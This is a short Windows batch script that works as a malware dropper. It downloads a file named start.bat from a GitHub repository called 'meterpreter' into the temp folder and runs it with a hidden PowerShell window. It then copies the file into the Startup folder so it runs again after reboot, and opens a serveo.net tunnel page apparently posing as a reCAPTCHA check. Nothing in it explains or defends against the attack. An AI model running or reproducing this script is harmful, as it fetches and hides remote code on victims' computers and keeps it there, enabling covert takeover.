@echo off
curl https://raw.githubusercontent.com/0x2034/meterpreter/main/start.bat -o "%temp%\start.bat"
powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"%temp%\start.bat\" -WindowStyle Hidden"
copy "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
start https://75f6bdf5748567109ec62184ce059c36.serveo.net/reCaPTCHA/r.html

